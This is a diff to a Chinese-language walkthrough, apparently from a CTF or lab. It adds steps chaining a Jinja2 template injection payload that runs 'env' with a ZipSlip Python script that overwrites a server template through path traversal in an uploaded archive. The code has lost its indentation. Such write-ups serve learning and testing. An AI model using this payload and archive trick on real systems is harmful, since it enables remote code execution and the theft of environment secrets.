@@ -93,4 +93,30 @@ return redirect(url_for("gallery"))
 
 return render_template("theme_upload.html")
 ```
-2. 然后这里同样存在一个SSTI模板注入，所以我们需要先构造一个
+2. 然后这里同样存在一个SSTI模板注入，所以我们需要先构造一个包含注入语句的`evil.html`:
+```html
+{{config.__class__.__init__.__globals__['os'].popen('env').read()}}
+```
+3. 接下来，我们需要精确地确定注入的路径。这里可以先在本地构建一个Docker，以便确定网站后台的结构：![image.png](https://img.uettypi.top/2026/05/20260523150935963.png)
+4. 确定好后，使用如下所示的ZipSlip生成脚本即可获得最终的`poc.zip`：
+```python
+import zipfile
+
+  
+
+if __name__ == "__main__":
+
+try:
+
+zipFile = zipfile.ZipFile("poc.zip", "a", zipfile.ZIP_DEFLATED)
+
+info = zipfile.ZipInfo("poc.zip")
+
+zipFile.write("evil.html", "../../templates/theme/card.html", zipfile.ZIP_DEFLATED)
+
+zipFile.close()
+
+except IOError as e:
+
+raise e
+```
